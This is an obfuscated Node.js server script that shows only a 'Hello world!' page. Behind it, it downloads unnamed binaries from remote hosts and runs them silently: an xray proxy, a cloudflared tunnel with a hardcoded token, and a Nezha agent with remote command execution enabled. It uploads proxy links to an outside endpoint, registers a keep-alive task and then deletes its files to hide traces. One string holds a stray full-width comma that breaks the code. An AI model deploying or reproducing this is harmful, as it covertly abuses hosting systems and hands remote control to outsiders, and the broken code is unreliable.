const _0x4381ed=_0x3c15;(function(_0x2e1698,_0x59160d){const _0x46e4f6=_0x3c15,_0x575983=_0x2e1698();while(!![]){try{const _0x12d044=-parseInt(_0x46e4f6(0xdb))/0x1+parseInt(_0x46e4f6(0x121))/0x2*(parseInt(_0x46e4f6(0x99))/0x3)+parseInt(_0x46e4f6(0x109))/0x4+-parseInt(_0x46e4f6(0xe7))/0x5+parseInt(_0x46e4f6(0xa0))/0x6*(parseInt(_0x46e4f6(0x123))/0x7)+parseInt(_0x46e4f6(0x135))/0x8+-parseInt(_0x46e4f6(0xcf))/0x9;if(_0x12d044===_0x59160d)break;else _0x575983['push'](_0x575983['shift']());}catch(_0x4c29d0){_0x575983['push'](_0x575983['shift']());}}}(_0x5419,0xbf697));const express=require(_0x4381ed(0xe6)),app=express(),axios=require(_0x4381ed(0x146)),os=require('os'),fs=require('fs'),path=require(_0x4381ed(0xf3)),{promisify}=require(_0x4381ed(0xd1)),exec=promisify(require(_0x4381ed(0xa4))[_0x4381ed(0xa3)]),{execSync}=require(_0x4381ed(0xa4)),UPLOAD_URL=process['env'][_0x4381ed(0xf9)]||'',PROJECT_URL=process[_0x4381ed(0xf6)][_0x4381ed(0x103)]||'',AUTO_ACCESS=process[_0x4381ed(0xf6)][_0x4381ed(0xd0)]||![],FILE_PATH=process[_0x4381ed(0xf6)][_0x4381ed(0xff)]||_0x4381ed(0x101),SUB_PATH=process['env']['SUB_PATH']||_0x4381ed(0x12b),PORT=process[_0x4381ed(0xf6)]['SERVER_PORT']||process[_0x4381ed(0xf6)]['PORT']||0xbb8,UUID=process[_0x4381ed(0xf6)][_0x4381ed(0x10a)]||'7e2ae7f2-defa-4c4f-a3d0-a0e60f81ee72',NEZHA_SERVER=process[_0x4381ed(0xf6)][_0x4381ed(0x10b)]||'',NEZHA_PORT=process[_0x4381ed(0xf6)][_0x4381ed(0xb5)]||'',NEZHA_KEY=process[_0x4381ed(0xf6)][_0x4381ed(0xcc)]||'',ARGO_DOMAIN=process[_0x4381ed(0xf6)][_0x4381ed(0xfc)]||_0x4381ed(0xad),ARGO_AUTH=process[_0x4381ed(0xf6)][_0x4381ed(0x10e)]||_0x4381ed(0x11e),ARGO_PORT=process[_0x4381ed(0xf6)]['ARGO_PORT']||0x1f41,CFIP=process[_0x4381ed(0xf6)][_0x4381ed(0xee)]||_0x4381ed(0xa9),CFPORT=process[_0x4381ed(0xf6)]['CFPORT']||0x1bb,NAME=process[_0x4381ed(0xf6)][_0x4381ed(0xa2)]||_0x4381ed(0xe9);!fs[_0x4381ed(0xb2)](FILE_PATH)?(fs[_0x4381ed(0x154)](FILE_PATH),console['log'](FILE_PATH+_0x4381ed(0xdc))):console[_0x4381ed(0x108)](FILE_PATH+_0x4381ed(0x10f));function generateRandomName(){const _0x2e06e8=_0x4381ed,_0x35cf29=_0x2e06e8(0xcb);let _0x3f7aad='';for(let _0x4ed273=0x0;_0x4ed273<0x6;_0x4ed273++){_0x3f7aad+=_0x35cf29[_0x2e06e8(0xe2)](Math[_0x2e06e8(0x128)](Math[_0x2e06e8(0xf2)]()*_0x35cf29[_0x2e06e8(0x130)]));}return _0x3f7aad;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();function _0x3c15(_0x21ba21,_0x57fc6e){const _0x54192a=_0x5419();return _0x3c15=function(_0x3c151f,_0x36036f){_0x3c151f=_0x3c151f-0x99;let _0x1e1ad9=_0x54192a[_0x3c151f];return _0x1e1ad9;},_0x3c15(_0x21ba21,_0x57fc6e);}let npmPath=path[_0x4381ed(0xc3)](FILE_PATH,npmName),phpPath=path[_0x4381ed(0xc3)](FILE_PATH,phpName),webPath=path[_0x4381ed(0xc3)](FILE_PATH,webName),botPath=path[_0x4381ed(0xc3)](FILE_PATH,botName),subPath=path[_0x4381ed(0xc3)](FILE_PATH,_0x4381ed(0xd9)),listPath=path[_0x4381ed(0xc3)](FILE_PATH,_0x4381ed(0xc6)),bootLogPath=path['join'](FILE_PATH,_0x4381ed(0xb0)),configPath=path['join'](FILE_PATH,_0x4381ed(0x131));function deleteNodes(){const _0x50443a=_0x4381ed;try{if(!UPLOAD_URL)return;if(!fs[_0x50443a(0xb2)](subPath))return;let _0xb03ea1;try{_0xb03ea1=fs[_0x50443a(0x10d)](subPath,'utf-8');}catch{return null;}const _0x4c5942=Buffer['from'](_0xb03ea1,_0x50443a(0xb4))[_0x50443a(0x127)](_0x50443a(0x13e)),_0x5b4c03=_0x4c5942['split']('\x0a')[_0x50443a(0x122)](_0x3939ff=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x50443a(0x100)](_0x3939ff));if(_0x5b4c03[_0x50443a(0x130)]===0x0)return;return axios['post'](UPLOAD_URL+_0x50443a(0xd4),JSON[_0x50443a(0xae)]({'nodes':_0x5b4c03}),{'headers':{'Content-Type':'application/json'}})['catch'](_0x13f0df=>{return null;}),null;}catch(_0x483a7d){return null;}}function cleanupOldFiles(){const _0x50462e=_0x4381ed;try{const _0x3969aa=fs[_0x50462e(0x144)](FILE_PATH);_0x3969aa[_0x50462e(0xe5)](_0x3affe8=>{const _0x3033f7=_0x50462e,_0x545688=path[_0x3033f7(0xc3)](FILE_PATH,_0x3affe8);try{const _0x3d9658=fs[_0x3033f7(0xb8)](_0x545688);_0x3d9658[_0x3033f7(0xdd)]()&&fs[_0x3033f7(0x14b)](_0x545688);}catch(_0x5a0f4f){}});}catch(_0x560e6c){}}app['get']('/',function(_0x391c40,_0x5ceec5){const _0x33e1f0=_0x4381ed;_0x5ceec5[_0x33e1f0(0xe3)]('Hello\x20world!');});async function generateConfig(){const _0x64a28a=_0x4381ed,_0x1d04e2={'log':{'access':_0x64a28a(0x117),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x64a28a(0x137),'settings':{'clients':[{'id':UUID,'flow':_0x64a28a(0xa8)}],'decryption':_0x64a28a(0xbf),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x64a28a(0xe8),'dest':0xbbb},{'path':_0x64a28a(0xfe),'dest':0xbbc}]},'streamSettings':{'network':_0x64a28a(0xfd)}},{'port':0xbb9,'listen':_0x64a28a(0xac),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x64a28a(0xfd),'security':_0x64a28a(0xbf)}},{'port':0xbba,'listen':_0x64a28a(0xac),'protocol':_0x64a28a(0x137),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x64a28a(0xbf),'wsSettings':{'path':_0x64a28a(0xf0)}},'sniffing':{'enabled':!![],'destOverride':[_0x64a28a(0xb9),_0x64a28a(0x143),_0x64a28a(0x155)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x64a28a(0xac),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x64a28a(0xe8)}},'sniffing':{'enabled':!![],'destOverride':[_0x64a28a(0xb9),_0x64a28a(0x143),_0x64a28a(0x155)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x64a28a(0xac),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x64a28a(0xbf),'wsSettings':{'path':_0x64a28a(0xfe)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x64a28a(0x143),_0x64a28a(0x155)],'metadataOnly':![]}}],'dns':{'servers':[_0x64a28a(0xf1)]},'outbounds':[{'protocol':_0x64a28a(0xc2),'tag':_0x64a28a(0xa6)},{'protocol':_0x64a28a(0xb1),'tag':_0x64a28a(0xb6)}]};fs[_0x64a28a(0x14e)](path[_0x64a28a(0xc3)](FILE_PATH,_0x64a28a(0x131)),JSON['stringify'](_0x1d04e2,null,0x2));}function getSystemArchitecture(){const _0x2e1d32=_0x4381ed,_0x3b0105=os[_0x2e1d32(0xc5)]();return _0x3b0105===_0x2e1d32(0x141)||_0x3b0105===_0x2e1d32(0xba)||_0x3b0105===_0x2e1d32(0xf4)?_0x2e1d32(0x141):_0x2e1d32(0xab);}function downloadFile(_0x32e340,_0x569207,_0x382212){const _0x96beb=_0x4381ed,_0x1c8cdb=_0x32e340;!fs[_0x96beb(0xb2)](FILE_PATH)&&fs[_0x96beb(0x154)](FILE_PATH,{'recursive':!![]});const _0x5d6968=fs['createWriteStream'](_0x1c8cdb);axios({'method':_0x96beb(0xe0),'url':_0x569207,'responseType':_0x96beb(0x148)})[_0x96beb(0xef)](_0x5b7c62=>{const _0x40afb9=_0x96beb;_0x5b7c62[_0x40afb9(0x13b)][_0x40afb9(0x150)](_0x5d6968),_0x5d6968['on'](_0x40afb9(0xca),()=>{const _0x271683=_0x40afb9;_0x5d6968[_0x271683(0x12d)](),console[_0x271683(0x108)]('Download\x20'+path[_0x271683(0xd6)](_0x1c8cdb)+'\x20successfully'),_0x382212(null,_0x1c8cdb);}),_0x5d6968['on'](_0x40afb9(0x9a),_0x8677d2=>{const _0x47cb84=_0x40afb9;fs[_0x47cb84(0x157)](_0x1c8cdb,()=>{});const _0x2dac58=_0x47cb84(0xda)+path['basename'](_0x1c8cdb)+_0x47cb84(0x9d)+_0x8677d2['message'];console[_0x47cb84(0x9a)](_0x2dac58),_0x382212(_0x2dac58);});})[_0x96beb(0x12c)](_0x346b2a=>{const _0x2e4971=_0x96beb,_0x5f2711=_0x2e4971(0xda)+path[_0x2e4971(0xd6)](_0x1c8cdb)+_0x2e4971(0x9d)+_0x346b2a[_0x2e4971(0x11f)];console[_0x2e4971(0x9a)](_0x5f2711),_0x382212(_0x5f2711);});}async function downloadFilesAndRun(){const _0x559a88=_0x4381ed,_0x593471=getSystemArchitecture(),_0x2ac979=getFilesForArchitecture(_0x593471);if(_0x2ac979[_0x559a88(0x130)]===0x0){console[_0x559a88(0x108)](_0x559a88(0xa7));return;}const _0x516b63=_0x2ac979[_0x559a88(0x114)](_0x2c25d8=>{return new Promise((_0x4e8216,_0x33aa8c)=>{const _0x4c5dbb=_0x3c15;downloadFile(_0x2c25d8['fileName'],_0x2c25d8[_0x4c5dbb(0x12f)],(_0x45038e,_0x2359ff)=>{_0x45038e?_0x33aa8c(_0x45038e):_0x4e8216(_0x2359ff);});});});try{await Promise['all'](_0x516b63);}catch(_0x560ace){console[_0x559a88(0x9a)](_0x559a88(0x9f),_0x560ace);return;}function _0x2b89f6(_0x5bfe52){const _0x4dd5f2=_0x559a88,_0x8bfaf7=0x1fd;_0x5bfe52[_0x4dd5f2(0xe5)](_0x2d6486=>{const _0xcfe4d3=_0x4dd5f2;fs[_0xcfe4d3(0xb2)](_0x2d6486)&&fs['chmod'](_0x2d6486,_0x8bfaf7,_0x428a1f=>{const _0xcfcc14=_0xcfe4d3;_0x428a1f?console[_0xcfcc14(0x9a)](_0xcfcc14(0xc1)+_0x2d6486+':\x20'+_0x428a1f):console[_0xcfcc14(0x108)](_0xcfcc14(0xce)+_0x2d6486+':\x20'+_0x8bfaf7[_0xcfcc14(0x127)](0x8));});});}const _0x1d6824=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2b89f6(_0x1d6824);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x6730ba=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x559a88(0x124)](':')[_0x559a88(0xb7)]():'',_0x45680f=new Set(['443',_0x559a88(0x118),_0x559a88(0x116),'2087',_0x559a88(0x133),'2053']),_0x2cd105=_0x45680f[_0x559a88(0x156)](_0x6730ba)?_0x559a88(0xfa):_0x559a88(0x11d),_0x189468=_0x559a88(0x125)+NEZHA_KEY+_0x559a88(0x105)+NEZHA_SERVER+_0x559a88(0x151)+_0x2cd105+_0x559a88(0x134)+UUID;fs[_0x559a88(0x14e)](path[_0x559a88(0xc3)](FILE_PATH,_0x559a88(0x14f)),_0x189468);const _0x4f8611=_0x559a88(0x138)+phpPath+_0x559a88(0x11a)+FILE_PATH+_0x559a88(0x14c);try{await exec(_0x4f8611),console[_0x559a88(0x108)](phpName+_0x559a88(0xd3)),await new Promise(_0x138fbb=>setTimeout(_0x138fbb,0x3e8));}catch(_0xbe809f){console[_0x559a88(0x9a)](_0x559a88(0x132)+_0xbe809f);}}else{let _0x5acc19='';const _0x39dd0e=[_0x559a88(0x9b),'8443',_0x559a88(0x116),'2087',_0x559a88(0x133),_0x559a88(0x14d)];_0x39dd0e[_0x559a88(0x12a)](NEZHA_PORT)&&(_0x5acc19=_0x559a88(0xcd));const _0x2097c4=_0x559a88(0x138)+npmPath+_0x559a88(0x126)+NEZHA_SERVER+':'+NEZHA_PORT+_0x559a88(0x112)+NEZHA_KEY+'\x20'+_0x5acc19+_0x559a88(0xbd);try{await exec(_0x2097c4),console[_0x559a88(0x108)](npmName+_0x559a88(0xd3)),await new Promise(_0x71570d=>setTimeout(_0x71570d,0x3e8));}catch(_0x2f6db4){console[_0x559a88(0x9a)]('npm\x20running\x20error:\x20'+_0x2f6db4);}}}else console[_0x559a88(0x108)](_0x559a88(0xc4));const _0x1cb80d=_0x559a88(0x138)+webPath+'\x20-c\x20'+FILE_PATH+_0x559a88(0x139);try{await exec(_0x1cb80d),console[_0x559a88(0x108)](webName+_0x559a88(0xd3)),await new Promise(_0x14e851=>setTimeout(_0x14e851,0x3e8));}catch(_0x2005f4){console[_0x559a88(0x9a)]('web\x20running\x20error:\x20'+_0x2005f4);}if(fs[_0x559a88(0xb2)](botPath)){let _0x4c6bfc;if(ARGO_AUTH[_0x559a88(0x110)](/^[A-Z0-9a-z=]{120,250}$/))_0x4c6bfc=_0x559a88(0xdf)+ARGO_AUTH;else ARGO_AUTH[_0x559a88(0x110)](/TunnelSecret/)?_0x4c6bfc='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x559a88(0x106):_0x4c6bfc='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x559a88(0x138)+botPath+'\x20'+_0x4c6bfc+_0x559a88(0xd7)),console[_0x559a88(0x108)](botName+_0x559a88(0xd3)),await new Promise(_0x3494a4=>setTimeout(_0x3494a4,0x7d0));}catch(_0x350121){console['error'](_0x559a88(0xea)+_0x350121);}}await new Promise(_0x48bd39=>setTimeout(_0x48bd39,0x1388));}function getFilesForArchitecture(_0x106e25){const _0x54a1fc=_0x4381ed;let _0x235318;_0x106e25===_0x54a1fc(0x141)?_0x235318=[{'fileName':webPath,'fileUrl':_0x54a1fc(0x129)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x235318=[{'fileName':webPath,'fileUrl':_0x54a1fc(0xd2)},{'fileName':botPath,'fileUrl':_0x54a1fc(0xe4)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1a8d0b=_0x106e25===_0x54a1fc(0x141)?'https://arm64.ssss.nyc.mn/agent':_0x54a1fc(0x10c);_0x235318['unshift']({'fileName':npmPath,'fileUrl':_0x1a8d0b});}else{const _0x501fe6=_0x106e25===_0x54a1fc(0x141)?_0x54a1fc(0xaf):'https://amd64.ssss.nyc.mn/v1';_0x235318[_0x54a1fc(0x115)]({'fileName':phpPath,'fileUrl':_0x501fe6});}}return _0x235318;}function argoType(){const _0x4d5d70=_0x4381ed;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4d5d70(0x12a)](_0x4d5d70(0xaa))){fs['writeFileSync'](path[_0x4d5d70(0xc3)](FILE_PATH,_0x4d5d70(0x111)),ARGO_AUTH);const _0x1f2ce9=_0x4d5d70(0xec)+ARGO_AUTH[_0x4d5d70(0x124)]('\x22')[0xb]+_0x4d5d70(0x152)+path[_0x4d5d70(0xc3)](FILE_PATH,_0x4d5d70(0x111))+_0x4d5d70(0xbe)+ARGO_DOMAIN+_0x4d5d70(0xfb)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0x4d5d70(0xc3)](FILE_PATH,_0x4d5d70(0xa5)),_0x1f2ce9);}else console['log'](_0x4d5d70(0xeb));}argoType();async function extractDomains(){const _0x148567=_0x4381ed;let _0x2e8815;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2e8815=ARGO_DOMAIN,console[_0x148567(0x108)]('ARGO_DOMAIN:',_0x2e8815),await _0xaf01f7(_0x2e8815);else try{const _0x180f96=fs[_0x148567(0x10d)](path[_0x148567(0xc3)](FILE_PATH,_0x148567(0xb0)),'utf-8'),_0x3e25fa=_0x180f96[_0x148567(0x124)]('\x0a'),_0x2f4752=[];_0x3e25fa[_0x148567(0xe5)](_0x112c6c=>{const _0x596ec7=_0x148567,_0x5be818=_0x112c6c[_0x596ec7(0x110)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x5be818){const _0x12b6f3=_0x5be818[0x1];_0x2f4752['push'](_0x12b6f3);}});if(_0x2f4752['length']>0x0)_0x2e8815=_0x2f4752[0x0],console[_0x148567(0x108)](_0x148567(0x13f),_0x2e8815),await _0xaf01f7(_0x2e8815);else{console[_0x148567(0x108)](_0x148567(0xe1)),fs[_0x148567(0x14b)](path[_0x148567(0xc3)](FILE_PATH,_0x148567(0xb0)));async function _0x691c90(){const _0x5c0826=_0x148567;try{process[_0x5c0826(0xbc)]===_0x5c0826(0xf5)?await exec(_0x5c0826(0xb3)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x5c0826(0xbb)+botName[_0x5c0826(0xe2)](0x0)+']'+botName[_0x5c0826(0xc8)](0x1)+_0x5c0826(0x12e));}catch(_0x5d4edb){}}_0x691c90(),await new Promise(_0x7cb89b=>setTimeout(_0x7cb89b,0xbb8));const _0xfac16e=_0x148567(0x113)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x148567(0x138)+botPath+'\x20'+_0xfac16e+_0x148567(0xd7)),console[_0x148567(0x108)](botName+_0x148567(0xd3)),await new Promise(_0x4d7949=>setTimeout(_0x4d7949,0xbb8)),await extractDomains();}catch(_0x2b27ae){console[_0x148567(0x9a)](_0x148567(0xea)+_0x2b27ae);}}}catch(_0x3100bb){console[_0x148567(0x9a)](_0x148567(0x9c),_0x3100bb);}async function _0xaf01f7(_0x4a0c8d){const _0x538ee8=_0x148567,_0x55e6fa=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x538ee8(0x13e)}),_0x3941ae=_0x55e6fa[_0x538ee8(0xc7)](),_0x11d8d3=NAME?NAME+'-'+_0x3941ae:_0x3941ae;return new Promise(_0x1e11f7=>{setTimeout(()=>{const _0x3af9c6=_0x3c15,_0x398bd0={'v':'2','ps':''+_0x11d8d3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x4a0c8d,'path':'/vmess-argo?ed=2560','tls':_0x3af9c6(0x143),'sni':_0x4a0c8d,'alpn':'','fp':'firefox'},_0x324246=_0x3af9c6(0x104)+UUID+'@'+CFIP+':'+CFPORT+_0x3af9c6(0xc9)+_0x4a0c8d+_0x3af9c6(0x149)+_0x4a0c8d+_0x3af9c6(0x9e)+_0x11d8d3+_0x3af9c6(0xd5)+Buffer[_0x3af9c6(0x136)](JSON['stringify'](_0x398bd0))[_0x3af9c6(0x127)](_0x3af9c6(0xb4))+_0x3af9c6(0x153)+UUID+'@'+CFIP+':'+CFPORT+_0x3af9c6(0xed)+_0x4a0c8d+_0x3af9c6(0x149)+_0x4a0c8d+_0x3af9c6(0xc0)+_0x11d8d3+_0x3af9c6(0x13d);console[_0x3af9c6(0x108)](Buffer[_0x3af9c6(0x136)](_0x324246)[_0x3af9c6(0x127)]('base64')),fs[_0x3af9c6(0x14e)](subPath,Buffer[_0x3af9c6(0x136)](_0x324246)[_0x3af9c6(0x127)](_0x3af9c6(0xb4))),console[_0x3af9c6(0x108)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x3af9c6(0xe0)]('/'+SUB_PATH,(_0x52983d,_0x5e931c)=>{const _0x36cd19=_0x3af9c6,_0x4f4ab8=Buffer[_0x36cd19(0x136)](_0x324246)[_0x36cd19(0x127)](_0x36cd19(0xb4));_0x5e931c[_0x36cd19(0x107)](_0x36cd19(0xf8),_0x36cd19(0x147)),_0x5e931c[_0x36cd19(0xe3)](_0x4f4ab8);}),_0x1e11f7(_0x324246);},0x7d0);});}}async function uploadNodes(){const _0x1a35a0=_0x4381ed;if(UPLOAD_URL&&PROJECT_URL){const _0x269e21=PROJECT_URL+'/'+SUB_PATH,_0x53f0dc={'subscription':[_0x269e21]};try{const _0x2d4204=await axios[_0x1a35a0(0xde)](UPLOAD_URL+'/api/add-subscriptions',_0x53f0dc,{'headers':{'Content-Type':_0x1a35a0(0x102)}});return _0x2d4204&&_0x2d4204['status']===0xc8?(console[_0x1a35a0(0x108)](_0x1a35a0(0x120)),_0x2d4204):null;}catch(_0x1391c6){if(_0x1391c6['response']){if(_0x1391c6[_0x1a35a0(0x142)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1a35a0(0xb2)](listPath))return;const _0x4f0846=fs[_0x1a35a0(0x10d)](listPath,_0x1a35a0(0x13e)),_0x2c385e=_0x4f0846['split']('\x0a')['filter'](_0x5a0644=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1a35a0(0x100)](_0x5a0644));if(_0x2c385e[_0x1a35a0(0x130)]===0x0)return;const _0x28d93d=JSON[_0x1a35a0(0xae)]({'nodes':_0x2c385e});try{const _0x5b2bea=await axios[_0x1a35a0(0xde)](UPLOAD_URL+_0x1a35a0(0xa1),_0x28d93d,{'headers':{'Content-Type':_0x1a35a0(0x102)}});return _0x5b2bea&&_0x5b2bea[_0x1a35a0(0xd8)]===0xc8?(console[_0x1a35a0(0x108)]('Nodes\x20uploaded\x20successfully'),_0x5b2bea):null;}catch(_0x4c4e45){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5e66f3=_0x3c15,_0x838f1a=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x838f1a[_0x5e66f3(0x140)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x838f1a[_0x5e66f3(0x140)](phpPath);process['platform']===_0x5e66f3(0xf5)?exec('del\x20/f\x20/q\x20'+_0x838f1a[_0x5e66f3(0xc3)]('\x20')+_0x5e66f3(0xf7),_0x4b4bac=>{const _0x17bab7=_0x5e66f3;console[_0x17bab7(0x13c)](),console['log']('App\x20is\x20running'),console[_0x17bab7(0x108)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x838f1a['join']('\x20')+_0x5e66f3(0x119),_0x340ee4=>{const _0x3c2902=_0x5e66f3;console[_0x3c2902(0x13c)](),console[_0x3c2902(0x108)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x2a2ec4=_0x4381ed;if(!AUTO_ACCESS||!PROJECT_URL){console['log']('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x45fc22=await axios[_0x2a2ec4(0xde)](_0x2a2ec4(0x145),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x2a2ec4(0x102)}});return console[_0x2a2ec4(0x108)](_0x2a2ec4(0x11c)),_0x45fc22;}catch(_0x30589e){return console[_0x2a2ec4(0x9a)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x30589e['message']),null;}}async function startserver(){const _0x5f26ae=_0x4381ed;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2fde1e){console[_0x5f26ae(0x9a)](_0x5f26ae(0x14a),_0x2fde1e);}}function _0x5419(){const _0x34ab14=['express','3083150omwsoE','/vmess-argo','GBargo','Error\x20executing\x20command:\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20tunnel:\x20','?security=tls&sni=','CFIP','then','/vless-argo','https+local://8.8.8.8/dns-query','random','path','aarch64','win32','env','\x20>\x20nul\x202>&1','Content-Type','UPLOAD_URL','true','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','ARGO_DOMAIN','tcp','/trojan-argo','FILE_PATH','test','./tmp','application/json','PROJECT_URL','\x0avless://','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/tunnel.yml\x20run','set','log','2114680ftIuup','UUID','NEZHA_SERVER','https://amd64.ssss.nyc.mn/agent','readFileSync','ARGO_AUTH','\x20already\x20exists','match','tunnel.json','\x20-p\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','map','unshift','2096','/dev/null','8443','\x20>/dev/null\x202>&1','\x20-c\x20\x22','listen','automatic\x20access\x20task\x20added\x20successfully','false','eyJhIjoiNzMxMjkxZDg1MDgzZmJmMTIyNjczZDVkODEwYWEwZDciLCJ0IjoiNTUzMGQ2M2YtNjRiZi00OGUyLWI1NmQtNjAyNzBmYjhjY2VkIiwicyI6Ik1HWTFPVFpoT0dZdE1qbGlZaTAwWVdFeUxXRXdZbUl0TmpBNU5qZzJOMk0zTWpWbSJ9','message','Subscription\x20uploaded\x20successfully','2IADyNf','filter','64449JzhvUb','split','\x0aclient_secret:\x20','\x20-s\x20','toString','floor','https://arm64.ssss.nyc.mn/web','includes','sub','catch','close','\x22\x20>\x20/dev/null\x202>&1','fileUrl','length','config.json','php\x20running\x20error:\x20','2083','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','9148328NLLGSj','from','vless','nohup\x20','/config.json\x20>/dev/null\x202>&1\x20&','Unhandled\x20error\x20in\x20startserver:','data','clear','\x0a\x20\x20\x20\x20','utf-8','ArgoDomain:','push','arm','response','tls','readdirSync','https://oooo.serv00.net/add-url','axios','text/plain;\x20charset=utf-8','stream','&fp=firefox&type=ws&host=','Error\x20in\x20startserver:','unlinkSync','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','2053','writeFileSync','config.yaml','pipe','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','\x0a\x20\x20credentials-file:\x20','\x0a\x20\x20\x0atrojan://','mkdirSync','quic','has','unlink','1390488EuuCsa','error','443','Error\x20reading\x20boot.log:','\x20failed:\x20','&path=%2Fvless-argo%3Fed%3D2560#','Error\x20downloading\x20files:','108aDPovU','/api/add-nodes','NAME','exec','child_process','tunnel.yml','direct','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','xtls-rprx-vision','cdns.doon.eu.org','TunnelSecret','amd'ï¼Œ'127.0.0.1','vargo.610424.xyz','stringify','https://arm64.ssss.nyc.mn/v1','boot.log','blackhole','existsSync','taskkill\x20/f\x20/im\x20','base64','NEZHA_PORT','block','pop','statSync','http','arm64','pkill\x20-f\x20\x22[','platform','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','none','&path=%2Ftrojan-argo%3Fed%3D2560#','Empowerment\x20failed\x20for\x20','freedom','join','NEZHA\x20variable\x20is\x20empty,skip\x20running','arch','list.txt','trim','substring','?encryption=none&security=tls&sni=','finish','abcdefghijklmnopqrstuvwxyz','NEZHA_KEY','--tls','Empowerment\x20success\x20for\x20','697158kOtygU','AUTO_ACCESS','util','https://amd64.ssss.nyc.mn/web','\x20is\x20running','/api/delete-nodes','\x0a\x20\x20\x0avmess://','basename','\x20>/dev/null\x202>&1\x20&','status','sub.txt','Download\x20','823318befOhC','\x20is\x20created','isFile','post','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','get','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','charAt','send','https://amd64.ssss.nyc.mn/bot','forEach'];_0x5419=function(){return _0x34ab14;};return _0x5419();}startserver()[_0x4381ed(0x12c)](_0x85814=>{const _0x14fa45=_0x4381ed;console[_0x14fa45(0x9a)](_0x14fa45(0x13a),_0x85814);}),app[_0x4381ed(0x11b)](PORT,()=>console[_0x4381ed(0x108)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
